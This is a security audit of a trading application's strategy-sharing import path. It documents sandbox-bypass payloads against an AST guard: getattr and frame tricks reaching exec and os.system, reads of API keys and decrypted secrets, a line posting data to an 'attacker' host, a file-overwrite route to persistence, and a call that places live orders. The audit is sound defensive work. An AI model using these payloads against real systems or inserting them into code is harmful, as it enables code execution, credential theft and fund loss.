# Strategy Sharing (Import/Export) Security Audit

**Created:** 2026-06-29
**Status:** **Findings confirmed. R1 + R4 + R5 + R7 IMPLEMENTED & TESTED 2026-06-29; R2 primitive landed; R2 full-wiring + R3 + R6 pending.**
- **R1 (code-import disabled):** `import_strategy_container` now **refuses** any envelope bundling `source_code.content` — the author's code never runs / is never written. Param/registry-type imports unaffected. (`test_strategy_portability.py` green.)
- **R4 (coding-cookie byte-scan) + R5 (guard hardening):** 126 guard tests green; all confirmed bypass families rejected; full builtin/composite/custom corpus re-scanned — only 6 already-un-importable non-UTF-8 files newly rejected (fail-closed).
- **R7 (honest UI):** the import dialog now states code-bundled import runs the author's code and is disabled; the import button is disabled for code-bundled envelopes.
- **R2 (out-of-process) — primitive landed:** `strategy_worker.validate_custom_module_isolated()` runs the untrusted **import + `__init__` + certification + lookahead** lifecycle in the locked-down child (secret-free env, network-denied, FS-confined, resource-capped) and returns only JSON metadata — parity-proven against in-process (`test_strategy_worker_parity.py`). **Remaining:** wire it into the registration paths *and* stop `registry.discover()` from importing custom code in the trusted parent (the pipeline-wide refactor), then re-enable code-import routed through the sandbox.

> **Hardening is defense-in-depth, NOT the trust boundary.** R5 closes the six guard-bypass families as a pre-filter, but CRIT-2 (confused-deputy via allowlisted `forven.*`) needs **no** bypass. The durable closure of CRIT-2 is R1 (now: shared code isn't executed at all) for the *sharing* path, and the R2 registry refactor for the *other* ingestion paths (AI-dropzone / auto-intake). Do not treat the hardened guard as sufficient.
**Scope:** The user-facing *strategy sharing* engine — export a strategy to a JSON envelope, import it on another machine. Driven by the question: *"Can a malicious shared strategy run code and exfiltrate the importing user's data on import?"*
**Method:** Multi-agent adversarial audit (5 mappers → 10 bypass-class red-teamers → independent per-candidate verification → synthesis). Every payload below was empirically run against the real `forven.sandbox.ast_guard.scan_source` on this machine and reproduced through the real import I/O with a **benign sentinel only** (no secrets/network touched). 43 candidates → **40 independently confirmed** (28 critical).

> **Bottom line: YES.** Importing a code-bundled shared strategy is **remote code execution** in the trusted API process, today, with one click and no further interaction. The single defense (a static AST guard) is defeated by **seven orthogonal, each-individually-sufficient** families — six guard bypasses plus one channel that needs *no* bypass at all. This is architectural, not a missing guard rule; patching the guard cannot close it.

---

## The trust boundary (where untrusted code runs)

`build_container_export()` bundles a custom strategy's **raw Python source** into `envelope.source_code.content`. On import:

```
POST /api/strategies/import
  → strategy_lifecycle.import_strategy_container()
      → _import_code_strategy()                       # source_code.content present
          scan_source(content)                        # AST guard #1   (strategy_lifecycle.py:1784)
          target.write_text(content, "utf-8")         # untrusted code now on disk  (:1815)
          → intake.register_custom_strategy_file()
              _file_uses_banned_imports() + scan_source()   # banned-'ta' gate + AST guard #2 (intake.py:480)
              importlib.import_module(fqn)             # ← TOP-LEVEL CODE EXECUTES   (intake.py:499)
              strategy_cls("__probe__", {})            # ← __init__ EXECUTES         (intake.py:540)
              detect_lookahead(probe)                  # ← generate_signals EXECUTES (intake.py:556)
          create_strategy_container(... stage="quick_screen")
```

All three execution sites run **in the trusted FastAPI parent**, before any backtest, with `os.environ` exchange/provider secrets, the **in-memory decrypted Fernet key**, exchange API creds, and the SQLite DB all reachable. The Phase‑2 out-of-process worker (`strategy_worker.py`, flag `FORVEN_ISOLATED_STRATEGY_EXEC`) is **off by default** *and* only wraps `generate_signals` during backtests — it **never covers import/`__init__`/probe**, so it provides **zero** protection on this path even when enabled. The AST guard is therefore the *sole* boundary, and its own docstring states it is "NOT a complete trust boundary."

---

## Confirmed findings (7 families, 40 payloads)

### CRIT‑1 — PEP 263 source-encoding cookie (scan/compile byte-view split) → unrestricted RCE
`scan_source` runs `ast.parse` on an already-UTF‑8-decoded `str`; CPython 3.11 **ignores** a PEP 263 coding cookie there and treats `# coding: utf-7` (and the payload line) as comments → `ok=True`. But `importlib` compiles the on-disk **bytes** honoring the cookie, re-decoding them under utf‑7 / `unicode_escape` / `raw_unicode_escape` into real top-level code. **Every** guard read on this path is UTF‑8 (`strategy_lifecycle.py:1784`, `intake.py:480`, `registry.py:458`, the banned-import gate), so no guard ever applies the codec.
**Why it's the worst:** the *entire module body* is re-decoded, so the executed source is **not even constrained by the import allowlist** — it can `import socket`/`urllib` to exfiltrate, read `os.environ`, open the DB. Fires *before* `__init__` and before the error-path `unlink`, so the payload need not even be a valid strategy. A `utf-7` blocklist is insufficient (proven via `unicode_escape`, `raw_unicode_escape`, codec aliases, line‑2 placement, mixed case). **Fix = scan the bytes the interpreter compiles; reject coding cookies/BOMs.**

### CRIT‑2 — Confused deputy: allowlisted `forven.*` modules (NO bypass needed)
`ALLOWED_FORVEN_PREFIXES` (`ast_guard.py:80-91`) hands untrusted code a capability surface. All of these `scan_source` `ok=True`:
- `import forven.scanner as sc; sc.kv_get('forven:settings:api-keys'); list(sc.get_db().execute('SELECT * FROM trades'))` — `forven.scanner` re-exports `forven.db.get_db/kv_get/kv_set` (verified identity-equal; `kv_get` decrypts). DB read **+ tamper** across all 87 tables.
- `sc._execute_direct(action='open', asset='BTC', direction='long', size=9999, price=1.0, stop_loss=0.5)` — a public **live-order sink** → `hyperliquid.market_order` signed with the operator wallet, needing no pre-existing trade row. **Direct financial loss / fund movement.**
- `import forven.data as fdata; fdata.Path(fdata.FORVEN_HOME,'auth.json').read_text()` — `forven.data` re-exports `pathlib.Path`/`shutil` → arbitrary read/write/delete of `~/.forven`, `.forven_key`, the whole DB. `fdata.get_exchange()` → ccxt client (SSRF-to-anywhere).
- `import forven.data_manager as dm; dm._http_session().post('http://attacker/x', data=secret)` — a raw `requests.Session`: **the exfil egress channel.**

This is the cleanest end-to-end theft *and* a direct fund-theft path, and it requires **no AST bypass at all**. (Mirrors the prior `agent-out-of-band-stage-write` incident.)

### CRIT‑3 — Frame introspection + Subscript-callee → builtins `exec`/`eval`, parent-frame secret read
Three guard gaps combine: (1) frame attrs `gi_frame`/`cr_frame`/`ag_frame`/`tb_frame`/`f_builtins`/`f_globals`/`f_locals`/`f_back` are **absent** from `FORBIDDEN_ATTRS`/`_TRAVERSAL_BLOCK`; (2) there is **no `visit_Subscript`**, so `d['exec'](...)` (a Call whose func is a Subscript) is never inspected; (3) a string constant inside a subscript is not an `ast.Name`, so `FORBIDDEN_NAME_LOADS` is blind. `ok=True`:
- `(x for x in [1]).gi_frame.f_builtins['exec']('import os; ...')` — reaches the live builtins dict with **no eval/exec/import token visible.**
- `try: raise Exception()` → `e.__traceback__.tb_frame.f_back.f_locals` — walks **up the import call stack** to read the trusted parent's in-scope decrypted-key / DB-session locals. Four distinct frame sources confirmed (gen/coroutine/async-gen/traceback) — closing one is insufficient.

### CRIT‑4 — `getattr(obj, '<const>')` string-indirection → blocked modules/builtins
The `getattr/setattr/delattr/hasattr` constant-string branch (`ast_guard.py:510-534`) only rejects **dunder** constants — plain strings `'builtins'`,`'os'`,`'sys'`,`'exec'`,`'open'`,`'system'`,`'environ'` all pass. `ok=True`:
- `getattr(getattr(dataclasses,'builtins'),'exec')('import os; ...')` — `dataclasses` re-exports the real `builtins`.
- `getattr(getattr(sklearn,'os'),'system')('cmd')` and `getattr(getattr(sklearn,'os'),'environ').get('POLYGON_API_KEY')` — every allowlisted lib does `import os`/`import sys`.
- `getattr(statistics,'sys').modules['os']` → pivot to any module. The resolved primitive binds to a Name and is called — a callee the attribute-form checks never see. One `getattr` yields `exec()`, whose opaque string defeats the whole allowlist. Not removable by dropping one module.

### CRIT‑5 — Allowlisted numeric libs expose native RCE; dotted-import allowlist checks only `split('.')[0]`
`_module_import_allowed` validates only the top package, so `import numpy.distutils.exec_command` passes (`top='numpy'`). `ok=True`:
- `import numpy.distutils.exec_command as h; h.exec_command(cmd)` — numpy's vendored shell helper; returns captured stdout = ready exfil.
- `np.ctypeslib.load_library('msvcrt', r'C:\Windows\System32')` then `getattr(lib,'system')(cmd)` — `ctypeslib` ≠ the blocked `ctypes`; yields a `ctypes.CDLL` (arbitrary native dispatch).
- `df.query('close.__init__.__globals__["sys"].modules["os"].system(cmd)', engine='python')` — the gadget lives in an **opaque string the AST never parses**; `.query` is on no denylist (only `.eval` is). Fires at the probe **and** every backtest.

### CRIT‑6 — Writer-method denylist gap → byte-exact arbitrary file write → persistent RCE
`FORBIDDEN_METHOD_NAMES` blocks readers/pickle/binary writers but omits the text/raw writers. `ok=True`: `to_csv`/`to_json`/`to_html`/`to_string`, `numpy.save`/`savez`/`savez_compressed`, and `ndarray.tofile` (byte-exact). `__file__` (an unblocked global) + `str.rsplit` derives the repo tree with no `os`/`pathlib`:
- `np.frombuffer(b'<python>', np.uint8).tofile(__file__.rsplit(sep,1)[0]+sep+'__init__.py')` — overwriting `custom/__init__.py` (committed, auto-imported on every `import forven.strategies.custom`, and **never** passed to `scan_source`) converts AFW into **unconstrained RCE on the next daemon restart**, or drop a `site-packages/*.pth`.

### MED‑7 — No resource bounds on the import path → wedge/OOM the single-worker daemon
The guard does no loop/complexity/timeout analysis; the import path has no watchdog/rlimit/isolation. `ok=True` and never returns inside `import_module`: `while True: pass`; `re.match(r'(a+)+$','a'*40+'!')` (ReDoS, holds the GIL); `math.factorial(500_000_000)`; unbounded `bytearray` growth. For a live-trading app this means **unmanaged open positions and a kill-switch that cannot fire**, and the orphaned `custom/<module>.py` re-wedges via `discover()`/`auto_intake` on every restart (boot-loop). Exfil scope nil → medium, but operationally serious.

---

## Systemic root causes

1. **Untrusted free Python executes in the trusted process at import time** (the master cause; every critical lands here).
2. **A static AST guard is the sole defense and is structurally not a trust boundary** — an import-allowlist + name/attr-denylist cannot enumerate Python's reflection / frame-introspection / source-encoding / dynamic-attribute / native-FFI surface.
3. **Scan-vs-compile mismatch** — the guard analyzes a different program (UTF‑8 `str`, cookies ignored) than the interpreter runs (raw bytes, cookies honored). `scan_file` even silently falls back to latin‑1.
4. **Allowlisted `forven.*` modules are confused deputies** re-exporting DB handles, decrypting `kv_get`, live-order sinks, a ccxt client, and a raw `requests.Session`.
5. **Phase‑2 isolation is off-by-default AND mis-scoped** — wraps the wrong phase (signals, not import/`__init__`/probe).
6. **No runtime resource governance** + single-worker server + orphan files re-executed on restart.
7. **Auth fails open** on keyless localhost (the default): any local process — a downloaded script, a compromised IDE/agent, the AI Drop Zone file drop — can POST an import unauthenticated.
8. **Misleading UI:** "will be security-scanned" is technically true (AST-only) but materially misleading — after the scan, the author's code runs in the importer's trusted process.

---

## Recommended safe-sharing model (layered, default-safe)

Do **not** rely on the AST guard as the boundary; do **not** ship code-bundled import in the trusted process under any guard configuration.

- **Tier 1 (DEFAULT — safe by construction): spec/param-only sharing.** The envelope carries only `{registry TYPE_NAME, params, execution_profile, metadata}` and **no** `source_code.content`. Import validates `TYPE_NAME` against the importer's **trusted local registry** and rebuilds from trusted code + shared params (reject unknown types). Zero attacker-controlled Python is ever loaded — the entire confirmed attack class becomes **structurally impossible**. Covers the overwhelming majority of real sharing (registry types tuned by parameters).
- **Tier 2 (OPT-IN, for genuinely-custom Python): mandatory out-of-process execution covering import + `__init__` + certification + lookahead-probe + signal-gen** (not just signals as today). Child = secret-scrubbed env (existing `env_allowlist`), no DB/exchange reachable (also requires Tier‑1's allowlist revocation so the confused-deputy modules are gone *inside* the child too), FS confinement (no write to `custom/`, site-packages, `~/.forven`), egress denied, CPU/mem/wall-clock capped, parquet-only schema-revalidated output (never a pickle/return value). The AST guard stays as a cheap pre-filter only.
- **Tier 3 (provenance, optional): signed/trusted-author.** Surfaces author identity/accountability in the UI but still executes in the Tier‑2 sandbox unless the operator explicitly elevates a specific trusted author. **Signing is identity, not safety.**

---

## Prioritized remediation

| # | Pri | Item | Effort | Addresses | Status |
|---|-----|------|--------|-----------|--------|
| R1 | **P0** | **Disable code-bundled import** (operator's chosen interim): `import_strategy_container` refuses any `source_code.content`; param/registry-type imports rebuild from the trusted local registry + shared params | M | the whole class for the sharing path | ✅ **done** |
| R2 | **P0** | **Move the entire untrusted-strategy lifecycle out-of-process** (import/`__init__`/cert/probe/signals), mandatory for code-bundled import; decouple from `FORVEN_ISOLATED_STRATEGY_EXEC` | L | CRIT‑1/3/4/5/6 containment, CRIT‑2 containment, MED‑7 | ◧ **primitive done** (`validate_custom_module_isolated`, parity-tested); registration-wiring + `discover()` refactor pending |
| R3 | **P1** | **Revoke the confused-deputy allowlist** — drop `forven.scanner`/`data`/`data_manager`/`strategies.sentiment` from `ALLOWED_FORVEN_PREFIXES`; expose only a curated read-only indicator facade. **NOTE:** ~40 real strategies import these, so this needs the facade + a corpus migration — do it WITH R2, not standalone | M | CRIT‑2 | ☐ pending (coupled to R2) |
| R4 | **P1** | **Scan the bytes the interpreter compiles** — reject non-utf‑8/ascii encodings (coding cookies + BOMs); kill `scan_file`'s latin‑1 fallback; regression-tested | S | CRIT‑1 | ✅ **done** |
| R5 | **P2** | **Harden the guard (defense-in-depth)** — frame/coroutine/traceback attrs, `visit_Subscript`, getattr constant-string beyond dunders, full dotted import path, native-FFI/loader names + write serializers + `.query(engine='python')` | M | CRIT‑3/4/5/6 (pre-filter) | ✅ **done** |
| R6 | **P2** | **Resource/DoS containment + orphan quarantine** — wall-clock/mem/CPU cap + kill on the import child; offload import off the request thread; unlink + persistently denylist failed imports; cover non-`ValueError` cleanup | M | MED‑7 | ☐ pending (lands with R2 wiring) |
| R7 | **P2** | **Fix the misleading UI** + close auth fail-open — dialog now states code runs on your machine + disables code-bundled import; operator-key-on-`/import` still pending | S | misleading UI ✅ / auth fail-open ☐ | ◧ UI done |
| R8 | **P3** | **Signed/trusted-author provenance** — detached signature; provenance, never authorization | M | Tier‑2 opt-in path | ☐ pending |

**Sequence:** **R1 + R4 + R5 + R7-UI shipped** (close the sharing-path RCE and shrink the surface). Remaining durable work: land the **R2 registry refactor** (parent never imports custom code; registration + execution routed through the now-built sandbox primitive), which also unlocks **R3** (facade) and **R6** (DoS containment) and lets code-import be re-enabled *through the sandbox*. Until then, **code-bundled import stays disabled** (R1).

---

## Residual risk

With **Tier 1** default, the RCE/exfil class is eliminated for the common case; only economic residual remains (adversarial params at the edges of allowed bounds — clamp imported params, lean on existing promotion/kill-switch gates). With **Tier 2**, free-Python import shifts from a one-line static bypass to a genuine OS-isolation escape (Job Object/rlimit weakness or a 0-day in a native lib loaded in the child) — materially higher bar, not zero; keep the child minimal/patched/egress-denied and prefer Tier 1. Minor divergences to fix regardless: the `_SCAN_VERDICT_CACHE` stat-key TOCTOU, `scan_file` latin‑1 fallback, and partial-failure orphan files. **The AST guard must never again be presented as a trust boundary.**
